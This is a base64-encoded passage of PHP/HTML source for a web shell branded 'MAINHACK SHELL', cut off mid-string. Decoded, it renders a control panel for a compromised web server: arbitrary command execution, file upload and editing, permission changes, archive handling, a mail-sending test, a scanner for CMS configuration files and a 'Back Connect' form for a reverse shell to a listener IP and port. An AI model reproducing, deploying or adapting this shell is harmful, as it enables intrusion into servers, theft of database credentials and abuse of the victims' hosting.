ICAgICAgICAuZGFyay1tb2RlIHRkIHNwYW5bc3R5bGUqPSJjb2xvcjogZ3JlZW4iXSB7IGNvbG9yOiAjNjZiYjZhICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGFyay1tb2RlIHRkIHNwYW5bc3R5bGUqPSJjb2xvcjogcmVkIl0geyBjb2xvcjogI2VmNTM1MCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRhcmstbW9kZSAuZm9vdGVyIHsgY29sb3I6ICNhYWE7IH0KICAgICAgICAuZGFyay1tb2RlIC5mb290ZXIgYSB7IGNvbG9yOiAjY2NjOyB9CiAgICAgICAgLmRhcmstbW9kZSAuc2lkZWJhciB7IGJhY2tncm91bmQtY29sb3I6ICMyNTI1MjU7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgIzQ0NDsgYm94LXNoYWRvdzogLTJweCAwIDVweCByZ2JhKDAsMCwwLDAuNCk7IH0KICAgICAgICAgLmRhcmstbW9kZSAuc2lkZWJhci1jbG9zZSBidXR0b24geyBiYWNrZ3JvdW5kOiAjOGIyMzMwOyBjb2xvcjogd2hpdGU7IH0KICAgICAgICAgLmRhcmstbW9kZSAuaW5mby1jb250YWluZXIgaDIgeyBib3JkZXItYm90dG9tOiAxcHggc29saWQgIzQ0NDsgY29sb3I6ICNjNWM1YzU7IH0KICAgICAgICAgLmRhcmstbW9kZSAuaW5mby1saXN0IHsgY29sb3I6ICNiNWI1YjU7IH0KICAgICAgICAgLmRhcmstbW9kZSAuaW5mby1saXN0IHNwYW5bc3R5bGUqPSJjb2xvcjpyZWQiXSB7IGNvbG9yOiAjZWY1MzUwICFpbXBvcnRhbnQ7IH0KICAgICAgICAgLmRhcmstbW9kZSAuaW5mby1saXN0IHNwYW5bc3R5bGUqPSJjb2xvcjpncmVlbiJdIHsgY29sb3I6ICM2NmJiNmEgIWltcG9ydGFudDsgfQogICAgICAgICAuZGFyay1tb2RlIC5pbmZvLWxpc3Qgc3BhbltzdHlsZSo9ImNvbG9yOm9yYW5nZSJdIHsgY29sb3I6ICNmZmE3MjYgIWltcG9ydGFudDsgfQoJCSAKICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHkgY2xhc3M9Ijw/cGhwIGVjaG8gJGJvZHlDbGFzczsgPz4iPgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+WyA8YSBocmVmPSJodHRwczovL3QubWUvTUFJTkg0Q0siIHRhcmdldD0iX2JsYW5rIiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lOyI+PHNwYW4gc3R5bGU9ImNvbG9yOiBncmVlbjsiPk1BSU5IQUNLIFNIRUxMPC9zcGFuPjwvYT4gXSA8c3BhbiBjbGFzcz0ibWVudS1pY29uIiBvbmNsaWNrPSJ0b2dnbGVTaWRlYmFyKCkiIHRpdGxlPSJUb2dnbGUgU2VydmVyIEluZm8iPjwvc3Bhbj48L2gxPgogICAgICAgIDxocj4KICAgICAgICA8ZGl2IGNsYXNzPSJidXR0b24tY29udGFpbmVyIj4KICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgc3R5bGU9ImRpc3BsYXk6IGlubGluZS1ibG9jazsiPiA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJTdW1tb24iIHZhbHVlPSJBZG1pbmVyIiBjbGFzcz0ic3VtbW9uLWJ1dHRvbiIgdGl0bGU9IkRvd25sb2FkIEFkbWluZXIgREIgVG9vbCI+IDwvZm9ybT4KICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24uaHJlZj0nP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkY3VycmVudERpcmVjdG9yeSk7ID8+Jmdhcz0xJyIgY2xhc3M9InN1bW1vbi1idXR0b24iIHRpdGxlPSJUZXN0IE1haWwgRnVuY3Rpb24iPk1haWwgVGVzdDwvYnV0dG9uPgogICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5ocmVmPSc/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4mZG89YmMnIiBjbGFzcz0ic3VtbW9uLWJ1dHRvbiIgdGl0bGU9Ik9wZW4gQmFjayBDb25uZWN0IEludGVyZmFjZSI+QkM8L2J1dHRvbj4KICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24uaHJlZj0nP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkY3VycmVudERpcmVjdG9yeSk7ID8+Jmdvbz1jb25maWcnIiBjbGFzcz0ic3VtbW9uLWJ1dHRvbiIgdGl0bGU9IlNjYW4gZm9yIENNUyBDb25maWcgRmlsZXMiPkNvbmZpZyBTY2FuPC9idXR0b24+CiAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGRpcm5hbWUoX19GSUxFX18pKTsgPz4iIGNsYXNzPSJzdW1tb24tYnV0dG9uIiB0aXRsZT0iR28gdG8gU2hlbGwgRGlyZWN0b3J5Ij5IT01FPC9hPiAgPC9kaXY+CiAgICAgICAgPGhyPgogICAgICAgICA8ZGl2IGNsYXNzPSJhY3Rpb25zLWNvbnRhaW5lciIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDE1cHg7Ij4KICAgICAgICAgICAgIDxzZWxlY3Qgb25jaGFuZ2U9ImlmKHRoaXMudmFsdWUpIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSc/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4mY3JlYXRlPScgKyB0aGlzLnZhbHVlOyB0aGlzLnNlbGVjdGVkSW5kZXg9MDsiPiA8b3B0aW9uIHZhbHVlPSIiIHNlbGVjdGVkIGRpc2FibGVkPkNyZWF0ZS4uLjwvb3B0aW9uPiA8b3B0aW9uIHZhbHVlPSJmaWxlIj5OZXcgRmlsZTwvb3B0aW9uPiA8b3B0aW9uIHZhbHVlPSJmb2xkZXIiPk5ldyBGb2xkZXI8L29wdGlvbj4gPC9zZWxlY3Q+CiAgICAgICAgIDwvZGl2PgoKICAgICAgICAgPD9waHAgaWYgKCFlbXB0eSgkZXJyb3JNZXNzYWdlKSkgOiA/PiA8ZGl2IGNsYXNzPSJlcnJvci1tZXNzYWdlIj48P3BocCBlY2hvICRlcnJvck1lc3NhZ2U7ID8+PC9kaXY+IDw/cGhwIGVuZGlmOyA/PgogICAgICAgICA8P3BocCBpZiAoIWVtcHR5KCRyZXNwb25zZU1lc3NhZ2UpKSA6ID8+IDxkaXYgY2xhc3M9InJlc3BvbnNlLW1lc3NhZ2UiPjw/cGhwIGVjaG8gJHJlc3BvbnNlTWVzc2FnZTsgPz48L2Rpdj4gPD9waHAgZW5kaWY7ID8+CgogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsnZ2FzJ10pKSA6ID8+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWFpbGVyLWZvcm0gY29tbWFuZC1vdXRwdXQiPiA8aDI+TWFpbCBUZXN0PC9oMj4gPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJGN1cnJlbnREaXJlY3RvcnkpOyA/PiZnYXM9MSI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJlbWFpbCIgcGxhY2Vob2xkZXI9IkVudGVyIHJlY2lwaWVudCBlbWFpbCIgcmVxdWlyZWQgc2l6ZT0iMzAiPiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2VuZCBUZXN0IEVtYWlsICZyYXF1bzsiPiA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfUE9TVFsnZW1haWwnXSkgJiYgaXNzZXQoJF9HRVRbJ2dhcyddKSkgeyAkcmVjaXBpZW50RW1haWwgPSBmaWx0ZXJfdmFyKHRyaW0oJF9QT1NUWydlbWFpbCddKSwgRklMVEVSX1ZBTElEQVRFX0VNQUlMKTsgaWYgKCRyZWNpcGllbnRFbWFpbCkgeyAkc2VuZGVyRG9tYWluID0gaXNzZXQoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pID8gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gOiAndW5rbm93bi5ob3N0JzsgJHVuaXF1ZUlkID0gc3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpLCB0cnVlKSksIDAsIDgpOyAkc3ViamVjdCA9ICJNQUlOSEFDSyBNYWlsZXIgVGVzdCBbIiAuICR1bmlxdWVJZCAuICJdIGZyb20gIiAuICRzZW5kZXJEb21haW47ICRtZXNzYWdlQm9keSA9ICI8aHRtbD48Ym9keT48aDE+VGVzdCBFbWFpbCBmcm9tIE1BSU5IQUNLPC9oMT48cD5TZXJ2ZXI6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRzZW5kZXJEb21haW4pIC4gIjwvcD48cD5UaGlzIGlzIGEgdGVzdCBlbWFpbCBzZW50IGZyb20gdGhlIE1BSU5IQUNLIHNoZWxsIGF0ICIgLiBkYXRlKCdZLW0tZCBIOmk6cyBUJykgLiAiLjwvcD48cD5VbmlxdWUgSUQ6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCR1bmlxdWVJZCkgLiAiPC9wPjwvYm9keT48L2h0bWw+IjsgJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuQ29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PVVURi04XHJcbkZyb206IE1BSU5IQUNLIFRlc3RlciA8bm9yZXBseUB7JHNlbmRlckRvbWFpbn0+XHJcbiI7IGlmIChAbWFpbCgkcmVjaXBpZW50RW1haWwsICRzdWJqZWN0LCAkbWVzc2FnZUJvZHksICRoZWFkZXJzKSkgeyBlY2hvICI8cCBzdHlsZT0nY29sb3I6IGdyZWVuOyBtYXJnaW4tdG9wOiAxMHB4Oyc+VGVzdCBlbWFpbCBzZW50IHRvIDxiPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRyZWNpcGllbnRFbWFpbCkgLiAiPC9iPi4gSUQ6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCR1bmlxdWVJZCkgLiAiLiBDaGVjayBzcGFtIGZvbGRlciB0b28uPC9wPiI7IH0gZWxzZSB7ICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7IGVjaG8gIjxwIHN0eWxlPSdjb2xvcjogcmVkOyBtYXJnaW4tdG9wOiAxMHB4Oyc+RmFpbGVkIHRvIHNlbmQgZW1haWwuIENoZWNrIHNlcnZlcidzIG1haWwgY29uZmlndXJhdGlvbi4gIiAuICgkZXJyb3IgPyBodG1sc3BlY2lhbGNoYXJzKCRlcnJvclsnbWVzc2FnZSddKSA6ICcnKSAuICI8L3A+IjsgfSB9IGVsc2UgeyBlY2hvICI8cCBzdHlsZT0nY29sb3I6IHJlZDsgbWFyZ2luLXRvcDogMTBweDsnPkludmFsaWQgZW1haWwgYWRkcmVzcyBwcm92aWRlZC48L3A+IjsgfSB9ID8+CiAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgPD9waHAgZW5kaWY7ID8+CgogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsnZG8nXSkgJiYgJF9HRVRbJ2RvJ10gPT0gJ2JjJykgOiA/PgogICAgICAgICAgICAgIDxkaXYgaWQ9ImJhY2tjb25uZWN0LWZvcm0iIGNsYXNzPSJjb21tYW5kLW91dHB1dCI+IDxoMj5CYWNrIENvbm5lY3Q8L2gyPiA8cD48Yj5XYXJuaW5nOjwvYj4gT3BlbnMgYSBkaXJlY3Qgc2hlbGwgY29ubmVjdGlvbi4gVXNlIG9ubHkgdHJ1c3RlZCBJUHMvUG9ydHMuPC9wPiA8Zm9ybSBtZXRob2Q9J3Bvc3QnIGFjdGlvbj0iP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkY3VycmVudERpcmVjdG9yeSk7ID8+JmRvPWJjIj4gPHRhYmxlPiA8dHI+PHRkPklQIEFkZHJlc3M6PC90ZD48dGQ+PGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2lwJyByZXF1aXJlZCBwbGFjZWhvbGRlcj0iTGlzdGVuZXIgSVAiPjwvdGQ+PC90cj4gPHRyPjx0ZD5Qb3J0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdwb3J0JyByZXF1aXJlZCBwbGFjZWhvbGRlcj0iTGlzdGVuZXIgUG9ydCAoZS5nLiwgNDQ0NCkiPjwvdGQ+PC90cj4gPHRyPjx0ZD48L3RkPjx0ZD48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdiaW5kJyB2YWx1ZT0nT3BlbiBDb25uZWN0aW9uJz48L3RkPjwvdHI+IDwvdGFibGU+IDwvZm9ybT4gPD9waHAgaWYgKGlzc2V0KCRfUE9TVFsnYmluZCddKSkgeyBlY2hvICRlcnJvck1lc3NhZ2U7IH0gPz4gPC9kaXY+CiAgICAgICAgIDw/cGhwIGVuZGlmOyA/PgoKICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9HRVRbJ2NyZWF0ZSddKSAmJiAkX0dFVFsnY3JlYXRlJ10gPT09ICdmaWxlJykgOiA/PiA8ZGl2IGNsYXNzPSJyZW5hbWUtZm9ybSI+IDxoMj5DcmVhdGUgTmV3IEZpbGU8L2gyPiA8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkY3VycmVudERpcmVjdG9yeSk7ID8+JmNyZWF0ZT1maWxlIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGVfbmFtZSIgcGxhY2Vob2xkZXI9IkVudGVyIG5ldyBmaWxlIG5hbWUiIHJlcXVpcmVkIHNpemU9IjQwIj4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkNyZWF0ZSBGaWxlIiBuYW1lPSJjcmVhdGVfZmlsZSIgY2xhc3M9ImJ1dHRvbiI+IDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJGN1cnJlbnREaXJlY3RvcnkpOyA/PiIgY2xhc3M9ImJ1dHRvbiI+Q2FuY2VsPC9hPiA8L2Zvcm0+IDwvZGl2PiA8P3BocCBlbmRpZjsgPz4KICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9HRVRbJ2NyZWF0ZSddKSAmJiAkX0dFVFsnY3JlYXRlJ10gPT09ICdmb2xkZXInKSA6ID8+IDxkaXYgY2xhc3M9InJlbmFtZS1mb3JtIj4gPGgyPkNyZWF0ZSBOZXcgRm9sZGVyPC9oMj4gPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJGN1cnJlbnREaXJlY3RvcnkpOyA/PiZjcmVhdGU9Zm9sZGVyIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZvbGRlcl9uYW1lIiBwbGFjZWhvbGRlcj0iRW50ZXIgbmV3IGZvbGRlciBuYW1lIiByZXF1aXJlZCBzaXplPSI0MCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJDcmVhdGUgRm9sZGVyIiBuYW1lPSJjcmVhdGVfZm9sZGVyIiBjbGFzcz0iYnV0dG9uIj4gPGEgaHJlZj0iP2Rpcj08P3BocCBlY2hvIHVybGVuY29kZSgkY3VycmVudERpcmVjdG9yeSk7ID8+IiBjbGFzcz0iYnV0dG9uIj5DYW5jZWw8L2E+IDwvZm9ybT4gPC9kaXY+IDw/cGhwIGVuZGlmOyA/PgoKICAgICAgICA8P3BocCAvKiBOb3RlOiBDaG1vZCBmb3JtIGRpc3BsYXkgbG9naWMgcmVtYWlucyBidXQgd29uJ3QgYmUgdHJpZ2dlcmVkIGJ5IHRhYmxlIGFjdGlvbnMgKi8gPz4KICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9HRVRbJ2NobW9kJ10pICYmIGZpbGVfZXhpc3RzKCRfR0VUWydjaG1vZCddKSkgOiA/PiA8ZGl2IGNsYXNzPSJjaGFuZ2UtcGVybWlzc2lvbiI+IDxoMj5DaGFuZ2UgUGVybWlzc2lvbjogPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRfR0VUWydjaG1vZCddKSk7ID8+PC9oMj4gPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoZGlybmFtZSgkX0dFVFsnY2htb2QnXSkpOyA/PiZjaG1vZD08P3BocCBlY2hvIHVybGVuY29kZSgkX0dFVFsnY2htb2QnXSk7ID8+Ij4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBlcm1pc3Npb24iIHBsYWNlaG9sZGVyPSJPY3RhbCAoZS5nLiwgMDc1NSkiIHJlcXVpcmVkIHBhdHRlcm49IlswLTddezMsNH0iIHRpdGxlPSJFbnRlciAzIG9yIDQgb2N0YWwgZGlnaXRzIiB2YWx1ZT0iPD9waHAgZWNobyBzdWJzdHIoc3ByaW50ZignJW8nLCBAZmlsZXBlcm1zKCRfR0VUWydjaG1vZCddKSksIC00KTsgPz4iPiA8YnV0dG9uIGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCI+Q2hhbmdlIFBlcm1pc3Npb25zPC9idXR0b24+IDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoZGlybmFtZSgkX0dFVFsnY2htb2QnXSkpOyA/PiIgY2xhc3M9ImJ1dHRvbiI+Q2FuY2VsPC9hPiA8L2Zvcm0+IDwvZGl2PiA8P3BocCBlbHNlaWYgKGlzc2V0KCRfR0VUWydjaG1vZCddKSkgOiA/PiA8ZGl2IGNsYXNzPSJlcnJvci1tZXNzYWdlIj5FcnJvcjogQ2Fubm90IGNoYW5nZSBwZXJtaXNzaW9uIC0gZmlsZSBvciBmb2xkZXIgbm90IGZvdW5kLjwvZGl2PiA8P3BocCBlbmRpZjsgPz4KCiAgICAgICAgPD9waHAgLyogTm90ZTogVW56aXAgZm9ybSBkaXNwbGF5IGxvZ2ljIHJlbWFpbnMgYnV0IHdvbid0IGJlIHRyaWdnZXJlZCBieSB0YWJsZSBhY3Rpb25zICovID8+CiAgICAgICAgPD9waHAgaWYgKGlzc2V0KCRfR0VUWydoYWhheSddKSAmJiAkX0dFVFsnaGFoYXknXSA9PSAndW56aXAnKSA6ID8+IDxkaXYgY2xhc3M9ImV4dHJhY3QtemlwLWZvcm0gY29tbWFuZC1vdXRwdXQiPiA8aDI+VW56aXAgQXJjaGl2ZTwvaDI+IDxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4maGFoYXk9dW56aXAiPiA8bGFiZWwgZm9yPSJleHRyYWN0LXppcC1maWxlIj5TZWxlY3QgWklQIEZpbGUgdG8gRXh0cmFjdDo8L2xhYmVsPiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZXh0cmFjdC16aXAtZmlsZSIgcmVxdWlyZWQgYWNjZXB0PSIuemlwIj4gPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImV4dHJhY3QtemlwIj5FeHRyYWN0IFpJUDwvYnV0dG9uPiA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4iIGNsYXNzPSJidXR0b24iPkNhbmNlbDwvYT4gPC9mb3JtPiA8L2Rpdj4gPD9waHAgZW5kaWY7ID8+CiAgICAgICAgPD9waHAgLyogTm90ZTogWmlwIGZvcm0gZGlzcGxheSBsb2dpYyByZW1haW5zIGJ1dCB3b24ndCBiZSB0cmlnZ2VyZWQgYnkgdGFibGUgYWN0aW9ucyAqLyA/PgogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsnaGFoYXknXSkgJiYgJF9HRVRbJ2hhaGF5J10gPT0gJ2V4dHJhY3RfemlwJykgOiA/PiA8ZGl2IGNsYXNzPSJ6aXAtZm9ybSBjb21tYW5kLW91dHB1dCI+IDxoMj5aaXAgRmlsZSAvIERpcmVjdG9yeTwvaDI+IDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4maGFoYXk9ZXh0cmFjdF96aXAiPiA8bGFiZWwgZm9yPSJ6aXAtdGFyZ2V0Ij5GaWxlIG9yIERpcmVjdG9yeSBQYXRoIHRvIFppcDo8L2xhYmVsPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iemlwLXRhcmdldCIgcGxhY2Vob2xkZXI9IkVudGVyIHBhdGggcmVsYXRpdmUgdG8gY3VycmVudCBkaXIsIG9yIGZ1bGwgcGF0aCIgcmVxdWlyZWQgc2l6ZT0iNTAiIHZhbHVlPSI8P3BocCBlY2hvIGlzc2V0KCRfR0VUWyd6aXBfdGFyZ2V0J10pID8gaHRtbHNwZWNpYWxjaGFycyh1cmxkZWNvZGUoJF9HRVRbJ3ppcF90YXJnZXQnXSkpIDogJyc7ID8+Ij4gPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9InppcCI+Q3JlYXRlIFppcDwvYnV0dG9uPiA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4iIGNsYXNzPSJidXR0b24iPkNhbmNlbDwvYT4gPC9mb3JtPiA8L2Rpdj4gPD9waHAgZW5kaWY7ID8+CgogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsncmVhZCddKSkgOiA/PgogICAgICAgICAgICA8P3BocCAkZmlsZVRvUmVhZCA9ICRfR0VUWydyZWFkJ107ICRmaWxlRGlyID0gZGlybmFtZSgkZmlsZVRvUmVhZCk7ICRlbmNvZGVkRGlyID0gdXJsZW5jb2RlKCRmaWxlRGlyKTsgJGVuY29kZWRGaWxlVG9SZWFkID0gdXJsZW5jb2RlKCRmaWxlVG9SZWFkKTsgPz4KICAgICAgICAgICAgPD9waHAgaWYgKGlzX2ZpbGUoJGZpbGVUb1JlYWQpKSA6ID8+CiAgICAgICAgICAgICAgICA8P3BocCAkY29udGVudFJlYWQgPSByZWFkRmlsZUNvbnRlbnQoJGZpbGVUb1JlYWQpOyA/PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZWRpdC1maWxlIj4gPGgzPlZpZXdpbmcgLyBFZGl0aW5nIEZpbGU6IDw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkZmlsZVRvUmVhZCkpOyA/PjwvaDM+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKHN0cnBvcygkY29udGVudFJlYWQsICdFcnJvcjonKSA9PT0gMCkgOiA/PgogICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0iY29sb3I6IHJlZDsiPjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkY29udGVudFJlYWQpOyA/PjwvcD4gPGhyPiA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gJGVuY29kZWREaXI7ID8+IiBjbGFzcz0iYnV0dG9uIj5CYWNrIHRvIERpcmVjdG9yeTwvYT4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlIDogPz4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgJGlzRWRpdGFibGUgPSBpc193cml0YWJsZSgkZmlsZVRvUmVhZCk7ICRyZWFkT25seUF0dHIgPSAhJGlzRWRpdGFibGUgPyAncmVhZG9ubHknIDogJyc7ICRkaXNhYmxlZEF0dHIgPSAhJGlzRWRpdGFibGUgPyAnZGlzYWJsZWQnIDogJyc7IGlmICghJGlzRWRpdGFibGUpIHsgZWNobyAnPHAgc3R5bGU9ImNvbG9yOiBvcmFuZ2U7IGZvbnQtd2VpZ2h0OiBib2xkOyI+RmlsZSBpcyBub3Qgd3JpdGFibGUuIEVkaXRpbmcgZGlzYWJsZWQuPC9wPic7IH0gPz4KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9kaXI9PD9waHAgZWNobyAkZW5jb2RlZERpcjsgPz4mZWRpdD08P3BocCBlY2hvICRlbmNvZGVkRmlsZVRvUmVhZDsgPz4iPiA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgPD9waHAgZWNobyAkcmVhZE9ubHlBdHRyOyA/Pj48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnRSZWFkKTsgPz48L3RleHRhcmVhPjxicj4gPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIDw/cGhwIGVjaG8gJGRpc2FibGVkQXR0cjsgPz4+U2F2ZSBDaGFuZ2VzPC9idXR0b24+IDxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyAkZW5jb2RlZERpcjsgPz4iIGNsYXNzPSJidXR0b24iPkNhbmNlbCAvIEJhY2s8L2E+IDwvZm9ybT4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPD9waHAgZWxzZSA6ID8+CiAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZXJyb3ItbWVzc2FnZSI+RXJyb3I6IEZpbGUgbm90IGZvdW5kIG9yIGlzIG5vdCBhIGZpbGUuPC9kaXY+IDxkaXYgc3R5bGU9Im1hcmdpbi10b3A6MTBweDsiPjxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyAkZW5jb2RlZERpcjsgPz4iIGNsYXNzPSJidXR0b24iPkJhY2sgdG8gRGlyZWN0b3J5PC9hPjwvZGl2PgogICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICA8P3BocCBlbmRpZjsgPz4KCiAgICAgICAgPD9waHAgaWYgKCEkaXNBY3Rpb25WaWV3KTogPz4KICAgICAgICAgICAgPGhyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1cGxvYWQtY21kLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ1cGxvYWQtZm9ybSI+IDxoMj5VcGxvYWQgRmlsZTwvaDI+IDxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4iPiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSI+IDxidXR0b24gY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWQiPlVwbG9hZDwvYnV0dG9uPiA8L2Zvcm0+IDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY21kLWZvcm0iPiA8aDI+RXhlY3V0ZSBDb21tYW5kPC9oMj4gPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ij9kaXI9PD9waHAgZWNobyB1cmxlbmNvZGUoJGN1cnJlbnREaXJlY3RvcnkpOyA/PiI+IDxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogbW9ub3NwYWNlOyI+PD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKEBnZXRfY3VycmVudF91c2VyKCkpIC4gIkAiIC4gaHRtbHNwZWNpYWxjaGFycyhAZ2V0aG9zdG5hbWUoKSkgLiAiOiIgLiBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRjdXJyZW50RGlyZWN0b3J5KSkgLiAiJCAiOyA/Pjwvc3Bhbj4gPGlucHV0IHR5cGU9J3RleHQnIHNpemU9JzUwJyBuYW1lPSdjbWQnIHBsYWNlaG9sZGVyPSJFbnRlciBjb21tYW5kIiBhdXRvZm9jdXM+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIiBjbGFzcz0iYnV0dG9uIj4gPC9mb3JtPiA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDw/cGhwIGlmICghZW1wdHkoJGNtZE91dHB1dCkpIDogPz4gPGRpdiBjbGFzcz0iY29tbWFuZC1vdXRwdXQiPiA8aDM+Q29tbWFuZCBPdXRwdXQ6PC9oMz4gPHByZT48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGNtZE91dHB1dCk7ID8+PC9wcmU+IDwvZGl2PiA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgPGhyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmaWxlbWFuYWdlci1jb250Y